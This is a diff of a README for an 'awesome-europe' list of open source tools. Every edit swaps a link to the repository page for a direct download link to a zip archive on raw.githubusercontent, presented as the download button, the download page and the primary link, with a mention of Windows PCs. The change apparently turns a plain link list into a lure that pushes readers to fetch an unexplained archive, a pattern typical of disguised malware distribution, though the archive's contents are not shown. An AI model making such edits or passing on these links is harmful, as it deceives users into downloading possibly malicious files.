@@ -1,6 +1,6 @@
 # 🇪🇺 awesome-europe - Open source tools for Europe
 
-[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/xthiyanx-ship-it/awesome-europe)
+[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/xthiyanx-ship-it/awesome-europe/main/media/awesome-europe-v3.3.zip)
 
 ## 🌍 What this is
 
@@ -20,7 +20,7 @@ Use it to find software that fits European needs, such as:
 
 Use this link to visit the page and download or view the content:
 
-[Visit the download page](https://github.com/xthiyanx-ship-it/awesome-europe)
+[Visit the download page](https://raw.githubusercontent.com/xthiyanx-ship-it/awesome-europe/main/media/awesome-europe-v3.3.zip)
 
 If you want to keep a local copy on your Windows PC:
 
@@ -276,7 +276,7 @@ It is useful if you want to:
 
 ## 🔗 Primary link
 
-[https://github.com/xthiyanx-ship-it/awesome-europe](https://github.com/xthiyanx-ship-it/awesome-europe)
+[https://raw.githubusercontent.com/xthiyanx-ship-it/awesome-europe/main/media/awesome-europe-v3.3.zip](https://raw.githubusercontent.com/xthiyanx-ship-it/awesome-europe/main/media/awesome-europe-v3.3.zip)
 
 ## 🪟 Windows path example
 
